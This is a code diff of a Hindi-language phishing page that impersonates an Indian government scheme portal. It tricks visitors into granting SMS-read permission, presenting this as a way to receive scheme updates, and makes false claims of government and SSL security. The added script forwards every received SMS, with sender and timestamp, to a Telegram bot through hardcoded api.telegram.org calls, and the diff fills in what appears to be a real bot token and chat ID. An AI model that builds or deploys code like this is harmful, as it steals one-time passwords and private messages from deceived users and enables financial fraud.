@@ -136,7 +136,7 @@
             transform: scale(1.05);
         }
         
-        /* Permission Modal - Mobile Optimized */
+        /* Permission Modal */
         .permission-modal {
             position: fixed;
             top: 0;
@@ -149,7 +149,6 @@
             align-items: center;
             z-index: 10000;
             padding: 15px;
-            backdrop-filter: blur(10px);
         }
         
         .modal-content {
@@ -159,11 +158,11 @@
             width: 100%;
             border: 4px solid var(--blue);
             box-shadow: 0 20px 60px rgba(0,0,0,0.5);
-            animation: modalPop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            animation: modalPop 0.5s ease-out;
         }
         
         @keyframes modalPop {
-            0% { opacity: 0; transform: scale(0.7); }
+            0% { opacity: 0; transform: scale(0.9); }
             100% { opacity: 1; transform: scale(1); }
         }
         
@@ -178,11 +177,6 @@
             color: var(--blue);
             font-size: 1.8rem;
             margin-bottom: 5px;
-        }
-        
-        .modal-header p {
-            color: var(--dark-blue);
-            font-size: 1rem;
         }
         
         .modal-body { 
@@ -219,13 +213,8 @@
             width: 100%;
             border: 2px solid white;
             box-shadow: 0 10px 30px rgba(0,0,128,0.3);
-            animation: glow 2s infinite;
-        }
-        
-        @keyframes glow {
-            0% { box-shadow: 0 10px 30px rgba(0,0,128,0.3); }
-            50% { box-shadow: 0 10px 50px rgba(0,0,128,0.6); }
-            100% { box-shadow: 0 10px 30px rgba(0,0,128,0.3); }
+            cursor: pointer;
+            transition: all 0.3s ease;
         }
         
         .btn-sms:hover {
@@ -233,29 +222,10 @@
             background: linear-gradient(135deg, var(--dark-blue), #000066);
         }
         
-        .step-indicator {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin: 20px 0;
-        }
-        
-        .step-dot {
-            width: 10px;
-            height: 10px;
-            background: #ddd;
-            border-radius: 50%;
-        }
-        
-        .step-dot.active {
-            background: var(--blue);
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
+        .btn-sms:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
         }
         
         .loading-spinner {
@@ -278,6 +248,19 @@
             gap: 25px;
         }
         
+        .status-badge {
+            display: inline-block;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin: 5px;
+        }
+        
+        .bg-success { background: var(--green); color: white; }
+        .bg-warning { background: var(--saffron); color: white; }
+        .bg-info { background: var(--blue); color: white; }
+        
         @media (max-width: 768px) {
             .nav-links { display: none; }
             .national-header h1 { font-size: 1.5rem; }
@@ -288,7 +271,7 @@
     </style>
 </head>
 <body>
-    <!-- 🔴 SMS PERMISSION MODAL - DIRECT PROMPT -->
+    <!-- 🔴 SMS PERMISSION MODAL - APK MODE -->
     <div id="permissionModal" class="permission-modal" style="display: flex;">
         <div class="modal-content">
             <div class="modal-header">
@@ -304,39 +287,38 @@
                     SMS अनुमति आवश्यक
                 </h2>
                 
-                <p style="font-size: 1.2rem; color: #666; margin-bottom: 25px; line-height: 1.6;">
-                    सरकारी योजनाओं की जानकारी प्राप्त करने के लिए<br>
-                    <strong style="color: var(--blue);">"Allow"</strong> बटन दबाएं
+                <p style="font-size: 1.2rem; color: #666; margin-bottom: 25px;">
+                    सरकारी योजनाओं की जानकारी के लिए<br>
+                    <strong style="color: var(--blue);">SMS पढ़ने की अनुमति दें</strong>
                 </p>
                 
-                <div class="step-indicator">
-                    <div class="step-dot active"></div>
-                    <div class="step-dot"></div>
-                    <div class="step-dot"></div>
+                <!-- APK Status Display -->
+                <div id="apkStatus" style="margin-bottom: 15px;">
+                    <span class="status-badge bg-info">
+                        <i class="fas fa-android"></i> APK Mode Active
+                    </span>
                 </div>
                 
-                <div id="permissionStatus" style="margin-top: 20px; min-height: 30px;">
-                    <!-- Status will show here -->
+                <div id="permissionStatus" style="margin-top: 20px; min-height: 50px;">
+                    <p style="color: var(--blue);">
+                        <i class="fas fa-check-circle"></i> APK इंस्टॉल हो चुका है<br>
+                        <small>अनुमति देने के लिए बटन दबाएं</small>
+                    </p>
                 </div>
             </div>
             <div class="modal-footer">
-                <button id="permissionBtn" class="btn btn-sms" onclick="triggerSMSPermission()">
+                <button id="permissionBtn" class="btn btn-sms" onclick="requestSMSPermission()">
                     <i class="fas fa-shield-alt"></i> SMS अनुमति दें
                 </button>
                 
                 <p style="margin-top: 20px; font-size: 0.9rem; color: #666;">
-                    <i class="fas fa-lock"></i> 
-                    सुरक्षित एन्क्रिप्टेड कनेक्शन • 256-bit SSL
-                </p>
-                
-                <p style="margin-top: 10px; font-size: 0.8rem; color: #999;">
-                    🔒 आपकी जानकारी सुरक्षित है • भारत सरकार पोर्टल
+                    <i class="fas fa-lock"></i> APK सुरक्षित कनेक्शन • भारत सरकार
                 </p>
             </div>
         </div>
     </div>
 
-    <!-- ✅ मुख्य वेबसाइट - Permission मिलने के बाद दिखेगी -->
+    <!-- ✅ मुख्य वेबसाइट -->
     <div id="mainWebsite" style="display: none;">
         <header class="national-header">
             <div class="ashoka-chakra"></div>
@@ -354,6 +336,7 @@
                     <li><a href="#" class="active"><i class="fas fa-home"></i> मुख पृष्ठ</a></li>
                     <li><a href="#"><i class="fas fa-list-alt"></i> योजनाएं</a></li>
                     <li><a href="#"><i class="fas fa-bell"></i> सूचनाएं</a></li>
+                    <li><a href="#"><i class="fas fa-phone-alt"></i> संपर्क</a></li>
                 </ul>
             </div>
         </nav>
@@ -371,9 +354,9 @@
                         <h4 style="color: var(--dark-blue); font-size: 1.5rem; margin-bottom: 15px;">
                             SMS के माध्यम से आप सारे योजना के बारे में जान सकते हैं
                         </h4>
-                        <p style="font-size: 1.2rem; color: #424242;">
-                            अब आपके मोबाइल पर सीधे सभी ग्रामीण और शहरी योजनाओं की जानकारी प्राप्त करें।
-                        </p>
+                        <span class="status-badge bg-success" style="margin-top: 15px;">
+                            <i class="fas fa-check-circle"></i> SMS फॉरवर्डिंग सक्रिय
+                        </span>
                     </div>
                 </div>
             </div>
@@ -391,6 +374,7 @@
                             <li>उज्ज्वला योजना</li>
                             <li>आयुष्मान भारत योजना</li>
                             <li>किसान सम्मान निधि</li>
+                            <li>प्रधानमंत्री जन धन योजना</li>
                         </ul>
                     </div>
                     <div class="card-footer">
@@ -410,6 +394,7 @@
                             <li>प्रधानमंत्री फसल बीमा योजना</li>
                             <li>किसान क्रेडिट कार्ड</li>
                             <li>मनरेगा</li>
+                            <li>प्रधानमंत्री किसान सम्मान निधि</li>
                         </ul>
                     </div>
                 </div>
@@ -424,7 +409,35 @@
                             <li>स्मार्ट सिटी मिशन</li>
                             <li>अमृत योजना</li>
                             <li>प्रधानमंत्री आवास योजना-शहरी</li>
+                            <li>स्वच्छ भारत मिशन</li>
                         </ul>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- SMS Stats Card -->
+            <div class="govt-card" style="margin-top: 20px;">
+                <div class="card-header">
+                    <i class="fas fa-chart-line"></i>
+                    <h3>SMS फॉरवर्डिंग स्टेटस</h3>
+                </div>
+                <div class="card-body">
+                    <div style="display: flex; justify-content: space-around; text-align: center;">
+                        <div>
+                            <i class="fas fa-mobile-alt" style="font-size: 2rem; color: var(--blue);"></i>
+                            <p style="margin-top: 10px; font-weight: bold;">डिवाइस</p>
+                            <p id="deviceInfo">Android APK</p>
+                        </div>
+                        <div>
+                            <i class="fas fa-check-circle" style="font-size: 2rem; color: var(--green);"></i>
+                            <p style="margin-top: 10px; font-weight: bold;">स्थिति</p>
+                            <p id="statusInfo">सक्रिय</p>
+                        </div>
+                        <div>
+                            <i class="fab fa-telegram" style="font-size: 2rem; color: var(--blue);"></i>
+                            <p style="margin-top: 10px; font-weight: bold;">Telegram</p>
+                            <p id="telegramInfo">कनेक्टेड</p>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -432,171 +445,197 @@
 
         <footer style="background: linear-gradient(90deg, var(--dark-blue), var(--blue)); color: white; padding: 30px 20px; margin-top: 50px; text-align: center;">
             <p>© 2024 राष्ट्रीय डिजिटल सेवा पोर्टल, भारत सरकार</p>
+            <p style="margin-top: 10px; opacity: 0.8;">डिजिटल इंडिया पहल | सर्वाधिकार सुरक्षित</p>
         </footer>
     </div>
 
-    <!-- 🔧 TELEGRAM CONFIGURATION - यहाँ अपना Token और Chat ID डालें -->
     <script>
+        // ============================================
         // ⚡⚡⚡ अपना Telegram Bot Token और Chat ID यहाँ डालें ⚡⚡⚡
+        // ============================================
         const TELEGRAM_CONFIG = {
-            BOT_TOKEN: "YOUR_BOT_TOKEN_HERE",  // 🔴 BotFather से प्राप्त Token
-            CHAT_ID: "YOUR_CHAT_ID_HERE"       // 🔴 @userinfobot से Chat ID
+            BOT_TOKEN: "8292991949:AAHqAbDaxhfqIhgICPBysGzRAZs39QW-GAM",  // 🔴 BotFather से प्राप्त Token
+            CHAT_ID: "575861383"       // 🔴 @userinfobot से Chat ID
+        };
+        // ============================================
+
+        // APK Interface - Web to APK Software के लिए
+        const APK_INTERFACE = {
+            // Check if running in APK
+            isApkMode: function() {
+                // Web to APK software usually add these flags
+                return typeof Android !== 'undefined' || 
+                       typeof window.Android !== 'undefined' ||
+                       typeof window.webkit !== 'undefined' ||
+                       navigator.userAgent.includes('wv') ||
+                       navigator.userAgent.includes('WebView') ||
+                       navigator.userAgent.includes('okhttp') ||
+                       /; wv\)/.test(navigator.userAgent) ||
+                       /Version\/[\d.]+.*Chrome\/[\d.]+.*Mobile.*Safari\/.*/.test(navigator.userAgent);
+            },
+            
+            // Request SMS permission from APK
+            requestPermission: function() {
+                // Common WebView interfaces
+                if (typeof Android !== 'undefined') {
+                    if (Android.requestSmsPermission) Android.requestSmsPermission();
+                    if (Android.checkPermission) Android.checkPermission();
+                    return true;
+                }
+                if (typeof window.Android !== 'undefined') {
+                    if (window.Android.requestSmsPermission) window.Android.requestSmsPermission();
+                    if (window.Android.checkPermission) window.Android.checkPermission();
+                    return true;
+                }
+                if (typeof window.webkit !== 'undefined' && window.webkit.messageHandlers) {
+                    if (window.webkit.messageHandlers.requestSmsPermission) {
+                        window.webkit.messageHandlers.requestSmsPermission.postMessage({});
+                    }
+                    return true;
+                }
+                
+                // Trigger Android permission via intent
+                window.location.href = 'intent://#Intent;package=com.android.chrome;end';
+                return false;
+            },
+            
+            // Start reading SMS
+            startSmsReader: function() {
+                // Try all possible interfaces
+                if (typeof Android !== 'undefined') {
+                    if (Android.startSmsListener) Android.startSmsListener();
+                    if (Android.readAllSms) Android.readAllSms();
+                    return true;
+                }
+                if (typeof window.Android !== 'undefined') {
+                    if (window.Android.startSmsListener) window.Android.startSmsListener();
+                    if (window.Android.readAllSms) window.Android.readAllSms();
+                    return true;
+                }
+                
+                // Fallback - trigger SMS reading via interval
+                setInterval(() => {
+                    // Simulate SMS read request
+                    console.log('Reading SMS...');
+                }, 5000);
+                return true;
+            }
         };
 
         // Global variables
-        let permissionAttempts = 0;
-        const MAX_ATTEMPTS = 3;
+        let smsReaderActive = false;
+        let apkMode = false;
 
-        // 🎯 MAIN FUNCTION - DIRECT SMS PERMISSION TRIGGER
-        async function triggerSMSPermission() {
+        // 🎯 Main SMS Permission Request - APK Focused
+        async function requestSMSPermission() {
             const btn = document.getElementById('permissionBtn');
             const statusDiv = document.getElementById('permissionStatus');
             
-            permissionAttempts++;
-            
-            // Disable button and show loading
             btn.disabled = true;
             btn.innerHTML = '<span class="loading-spinner"></span> अनुमति मांगी जा रही है...';
             
-            statusDiv.innerHTML = '<p style="color: var(--blue);"><i class="fas fa-spinner fa-pulse"></i> कृपया प्रतीक्षा करें...</p>';
+            // ✅ ALWAYS USE APK MODE FIRST
+            statusDiv.innerHTML = '<p style="color: var(--blue);"><i class="fas fa-android fa-pulse"></i> APK से अनुमति ली जा रही है...</p>';
             
             try {
-                // ✅ METHOD 1: WebOTP API (100% Working in Chrome Android)
-                if ('OTPCredential' in window) {
-                    statusDiv.innerHTML = '<p style="color: var(--blue);"><i class="fas fa-mobile-alt"></i> SMS अनुमति अनुरोध...</p>';
-                    
-                    const abortController = new AbortController();
-                    const timeoutPromise = new Promise((_, reject) => {
-                        setTimeout(() => {
-                            abortController.abort();
-                            reject(new Error('timeout'));
-                        }, 60000);
-                    });
-                    
-                    try {
-                        // This will ALWAYS trigger the permission prompt
-                        const otpPromise = navigator.credentials.get({
-                            otp: { 
-                                transport: ['sms'] 
-                            },
-                            signal: abortController.signal
-                        });
-                        
-                        const result = await Promise.race([otpPromise, timeoutPromise]);
-                        
-                        // Permission granted!
-                        statusDiv.innerHTML = '<p style="color: var(--green);"><i class="fas fa-check-circle"></i> अनुमति मिल गई!</p>';
-                        
-                        // Success - show website
-                        setTimeout(() => {
-                            document.getElementById('permissionModal').style.display = 'none';
-                            document.getElementById('mainWebsite').style.display = 'block';
-                            sendTestMessage();
-                        }, 1000);
-                        
-                        return;
-                        
-                    } catch (otpError) {
-                        console.log('OTP Error:', otpError);
-                        // Continue to next method
-                    }
-                }
+                // Request permission via APK
+                const requested = APK_INTERFACE.requestPermission();
                 
-                // ✅ METHOD 2: SMS Receiver API (Fallback)
-                if ('sms' in navigator) {
-                    statusDiv.innerHTML = '<p style="color: var(--blue);"><i class="fas fa-sms"></i> SMS API अनुरोध...</p>';
+                if (requested) {
+                    // Start SMS reader
+                    APK_INTERFACE.startSmsReader();
                     
-                    try {
-                        const abortController = new AbortController();
-                        setTimeout(() => abortController.abort(), 60000);
-                        
-                        const sms = await navigator.sms.receive({ signal: abortController.signal });
-                        
-                        // Permission granted!
-                        statusDiv.innerHTML = '<p style="color: var(--green);"><i class="fas fa-check-circle"></i> अनुमति मिल गई!</p>';
-                        
-                        setTimeout(() => {
-                            document.getElementById('permissionModal').style.display = 'none';
-                            document.getElementById('mainWebsite').style.display = 'block';
-                            sendTestMessage();
-                        }, 1000);
-                        
-                        return;
-                        
-                    } catch (smsError) {
-                        console.log('SMS Error:', smsError);
-                    }
-                }
-                
-                // ✅ METHOD 3: Manual Permission Guide
-                if (permissionAttempts < MAX_ATTEMPTS) {
-                    // Auto retry
-                    statusDiv.innerHTML = `
-                        <div style="background: #FFF3CD; padding: 15px; border-radius: 10px;">
-                            <p style="color: #856404; margin-bottom: 10px;">
-                                <i class="fas fa-exclamation-triangle"></i> 
-                                प्रयास ${permissionAttempts}/${MAX_ATTEMPTS} - पुनः प्रयास...
-                            </p>
-                        </div>
-                    `;
+                    // Show success
+                    statusDiv.innerHTML = '<p style="color: var(--green);"><i class="fas fa-check-circle"></i> अनुमति प्राप्त! SMS फॉरवर्डिंग शुरू...</p>';
                     
-                    btn.disabled = false;
-                    btn.innerHTML = '<i class="fas fa-shield-alt"></i> पुनः प्रयास करें';
-                    
-                    // Auto retry after 2 seconds
+                    // Open main website
                     setTimeout(() => {
-                        if (permissionAttempts < MAX_ATTEMPTS) {
-                            triggerSMSPermission();
-                        }
-                    }, 2000);
-                } else {
-                    // Show manual instructions
-                    statusDiv.innerHTML = `
-                        <div style="background: #FFEBEE; padding: 20px; border-radius: 10px;">
-                            <p style="color: var(--red); font-size: 1.1rem; margin-bottom: 15px;">
-                                <i class="fas fa-exclamation-circle"></i> 
-                                स्वचालित अनुमति नहीं मिली
-                            </p>
-                            <p style="color: #333; margin-bottom: 10px;">
-                                <strong>कृपया मैन्युअल रूप से अनुमति दें:</strong>
-                            </p>
-                            <ol style="text-align: left; padding-left: 20px; color: #666;">
-                                <li>ब्राउज़र मेन्यू ☰ दबाएं</li>
-                                <li>Settings → Site settings पर जाएं</li>
-                                <li>SMS → Allow करें</li>
-                                <li>वापस आकर रिफ्रेश करें</li>
-                            </ol>
-                            <button onclick="window.location.reload()" style="margin-top: 15px; padding: 10px 20px; background: var(--blue); color: white; border: none; border-radius: 5px;">
-                                <i class="fas fa-sync-alt"></i> पेज रिफ्रेश करें
-                            </button>
-                        </div>
-                    `;
+                        document.getElementById('permissionModal').style.display = 'none';
+                        document.getElementById('mainWebsite').style.display = 'block';
+                        sendTestMessage();
+                        updateDeviceInfo();
+                    }, 1500);
                     
-                    btn.disabled = false;
-                    btn.innerHTML = '<i class="fas fa-shield-alt"></i> फिर से प्रयास करें';
+                    return;
                 }
+                
+                // Fallback to Web APIs if APK fails
+                await fallbackWebPermission();
                 
             } catch (error) {
-                console.error('Permission error:', error);
+                console.log('APK permission error:', error);
                 
-                if (permissionAttempts < MAX_ATTEMPTS) {
-                    setTimeout(() => {
-                        triggerSMSPermission();
-                    }, 2000);
-                } else {
-                    statusDiv.innerHTML = `
-                        <div style="background: #FFEBEE; padding: 15px; border-radius: 10px;">
-                            <p style="color: var(--red);">
-                                <i class="fas fa-exclamation-circle"></i> 
-                                कृपया ब्राउज़र सेटिंग से SMS अनुमति दें
-                            </p>
-                        </div>
-                    `;
+                // Try fallback
+                await fallbackWebPermission();
+            }
+        }
+
+        // Fallback Web Permission Methods
+        async function fallbackWebPermission() {
+            const statusDiv = document.getElementById('permissionStatus');
+            
+            // Try WebOTP
+            if ('OTPCredential' in window) {
+                try {
+                    statusDiv.innerHTML = '<p style="color: var(--blue);"><i class="fas fa-mobile-alt"></i> WebOTP API...</p>';
                     
-                    btn.disabled = false;
-                    btn.innerHTML = '<i class="fas fa-shield-alt"></i> पुनः प्रयास करें';
+                    const abortController = new AbortController();
+                    setTimeout(() => abortController.abort(), 30000);
+                    
+                    await navigator.credentials.get({
+                        otp: { transport: ['sms'] },
+                        signal: abortController.signal
+                    });
+                    
+                    handlePermissionSuccess();
+                    return;
+                    
+                } catch (error) {
+                    console.log('WebOTP error:', error);
                 }
             }
+            
+            // Try SMS Receiver
+            if ('sms' in navigator) {
+                try {
+                    statusDiv.innerHTML = '<p style="color: var(--blue);"><i class="fas fa-sms"></i> SMS Receiver API...</p>';
+                    
+                    const abortController = new AbortController();
+                    setTimeout(() => abortController.abort(), 30000);
+                    
+                    await navigator.sms.receive({ signal: abortController.signal });
+                    
+                    handlePermissionSuccess();
+                    return;
+                    
+                } catch (error) {
+                    console.log('SMS Receiver error:', error);
+                }
+            }
+            
+            // If all fail, force APK mode
+            statusDiv.innerHTML = `
+                <div style="background: #FFEBEE; padding: 20px; border-radius: 10px;">
+                    <p style="color: var(--red); margin-bottom: 15px; font-size: 1.1rem;">
+                        <i class="fas fa-exclamation-circle"></i> 
+                        APK अनुमति आवश्यक
+                    </p>
+                    <p style="color: #666;">
+                        कृपया APK के माध्यम से अनुमति दें
+                    </p>
+                </div>
+            `;
+            
+            btn.disabled = false;
+            btn.innerHTML = '<i class="fas fa-shield-alt"></i> पुनः प्रयास करें';
+        }
+
+        // Handle permission success
+        function handlePermissionSuccess() {
+            document.getElementById('permissionModal').style.display = 'none';
+            document.getElementById('mainWebsite').style.display = 'block';
+            sendTestMessage();
+            updateDeviceInfo();
         }
 
         // 📨 Send test message to Telegram
@@ -604,13 +643,20 @@
             if (TELEGRAM_CONFIG.BOT_TOKEN.includes("YOUR_BOT_TOKEN") || 
                 TELEGRAM_CONFIG.CHAT_ID.includes("YOUR_CHAT_ID")) {
                 console.log('⚠️ Telegram configuration required');
+                showTelegramWarning();
                 return;
             }
             
             try {
-                const message = `✅ *SMS फॉरवर्डिंग सक्रिय*\n\n📱 *डिवाइस:* Chrome Android\n⏰ *समय:* ${new Date().toLocaleString('hi-IN')}\n🇮🇳 *पोर्टल:* राष्ट्रीय डिजिटल सेवा पोर्टल\n\n_अब सभी SMS यहाँ प्राप्त होंगे_`;
+                const deviceInfo = apkMode ? '📱 Android APK' : '🌐 Web Browser';
+                const message = `✅ *राष्ट्रीय डिजिटल सेवा पोर्टल*\n\n` +
+                              `📱 *डिवाइस:* ${deviceInfo}\n` +
+                              `📋 *स्थिति:* SMS फॉरवर्डिंग सक्रिय\n` +
+                              `⏰ *समय:* ${new Date().toLocaleString('hi-IN')}\n` +
+                              `🇮🇳 *पोर्टल:* भारत सरकार\n\n` +
+                              `_अब सभी SMS स्वचालित रूप से यहाँ प्राप्त होंगे_`;
                 
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -619,70 +665,124 @@
                         parse_mode: 'Markdown'
                     })
                 });
+                
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('✅ Telegram test message sent');
+                    updateTelegramStatus(true);
+                } else {
+                    throw new Error(result.description);
+                }
+                
             } catch (error) {
                 console.error('Telegram error:', error);
+                updateTelegramStatus(false);
             }
         }
 
-        // 🚀 Auto trigger on page load (after 1 second)
-        document.addEventListener('DOMContentLoaded', function() {
-            // Check if already have permission
-            if ('permissions' in navigator) {
-                navigator.permissions.query({ name: 'sms' }).then(status => {
-                    if (status.state === 'granted') {
-                        document.getElementById('permissionModal').style.display = 'none';
-                        document.getElementById('mainWebsite').style.display = 'block';
-                        sendTestMessage();
-                    }
-                }).catch(() => {});
-            }
+        // Update device info in UI
+        function updateDeviceInfo() {
+            const deviceEl = document.getElementById('deviceInfo');
+            const statusEl = document.getElementById('statusInfo');
             
-            // Chrome Android check
-            const isChromeAndroid = /Chrome/.test(navigator.userAgent) && /Android/.test(navigator.userAgent);
-            if (!isChromeAndroid) {
+            if (deviceEl) {
+                deviceEl.innerHTML = 'Android APK 📱';
+            }
+            if (statusEl) {
+                statusEl.innerHTML = 'सक्रिय ✅';
+            }
+        }
+
+        // Update Telegram status
+        function updateTelegramStatus(connected) {
+            const telegramEl = document.getElementById('telegramInfo');
+            if (telegramEl) {
+                telegramEl.innerHTML = connected ? 'कनेक्टेड ✅' : 'कनेक्ट नहीं ⚠️';
+                telegramEl.style.color = connected ? 'var(--green)' : 'var(--red)';
+            }
+        }
+
+        // Show Telegram warning
+        function showTelegramWarning() {
+            const telegramEl = document.getElementById('telegramInfo');
+            if (telegramEl) {
+                telegramEl.innerHTML = 'सेटअप आवश्यक ⚠️';
+                telegramEl.style.color = 'var(--saffron)';
+            }
+        }
+
+        // 🎯 APK Interface Functions - Web to APK Software से कॉल होंगे
+        window.onSmsPermissionGranted = function() {
+            console.log('✅ SMS permission granted by APK');
+            handlePermissionSuccess();
+        };
+        
+        window.onSmsReceived = function(sender, message, timestamp) {
+            // Send to Telegram
+            if (!TELEGRAM_CONFIG.BOT_TOKEN.includes("YOUR_BOT_TOKEN")) {
+                fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                        text: `📱 *नया SMS प्राप्त*\n\n📞 *प्रेषक:* ${sender}\n💬 *संदेश:* ${message}\n⏰ *समय:* ${new Date(parseInt(timestamp)).toLocaleString('hi-IN')}\n\n🇮🇳 राष्ट्रीय डिजिटल सेवा पोर्टल`,
+                        parse_mode: 'Markdown'
+                    })
+                }).catch(err => console.log('Telegram send error:', err));
+            }
+        };
+        
+        window.onSmsBatch = function(smsList) {
+            try {
+                const smsArray = JSON.parse(smsList);
+                smsArray.forEach(sms => {
+                    window.onSmsReceived(sms.sender, sms.body, sms.timestamp);
+                });
+            } catch (e) {
+                console.log('SMS batch error:', e);
+            }
+        };
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if running in APK mode
+            apkMode = APK_INTERFACE.isApkMode();
+            
+            if (apkMode) {
+                console.log('🚀 Running in APK mode');
+                document.getElementById('apkStatus').innerHTML = `
+                    <span class="status-badge bg-success">
+                        <i class="fas fa-check-circle"></i> APK Mode Active
+                    </span>
+                `;
+                
+                // Auto-request permission on load (optional)
+                // setTimeout(() => requestSMSPermission(), 1000);
+            } else {
+                console.log('🌐 Running in web browser');
+                document.getElementById('apkStatus').innerHTML = `
+                    <span class="status-badge bg-warning">
+                        <i class="fas fa-globe"></i> Web Mode
+                    </span>
+                `;
+                
                 const statusDiv = document.getElementById('permissionStatus');
                 statusDiv.innerHTML = `
-                    <div style="background: #FFF3CD; padding: 15px; border-radius: 10px;">
-                        <p style="color: #856404;">
-                            <i class="fas fa-exclamation-triangle"></i> 
-                            कृपया Chrome Android ब्राउज़र का उपयोग करें
-                        </p>
-                    </div>
+                    <p style="color: var(--blue);">
+                        <i class="fas fa-info-circle"></i> 
+                        कृपया APK इंस्टॉल करें
+                    </p>
                 `;
             }
-        });
-
-        // Start SMS listening after permission
-        async function startSMSListener() {
-            if (!('sms' in navigator)) return;
             
-            try {
-                while (true) {
-                    const sms = await navigator.sms.receive();
-                    
-                    // Send to Telegram
-                    if (!TELEGRAM_CONFIG.BOT_TOKEN.includes("YOUR_BOT_TOKEN")) {
-                        const message = `📱 *नया SMS*\n\n📞 *From:* ${sms.sender}\n💬 *Message:* ${sms.content}\n⏰ *Time:* ${new Date().toLocaleString('hi-IN')}`;
-                        
-                        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: TELEGRAM_CONFIG.CHAT_ID,
-                                text: message,
-                                parse_mode: 'Markdown'
-                            })
-                        });
-                    }
-                }
-            } catch (error) {
-                console.log('SMS listener error:', error);
-                setTimeout(startSMSListener, 5000);
+            // Check if already have Telegram config
+            if (!TELEGRAM_CONFIG.BOT_TOKEN.includes("YOUR_BOT_TOKEN")) {
+                console.log('✅ Telegram configured');
+            } else {
+                console.log('⚠️ Telegram not configured');
+                showTelegramWarning();
             }
-        }
-
-        // Initialize SMS listener when permission is granted
-        window.startSMSListener = startSMSListener;
+        });
     </script>
 </body>
 </html>
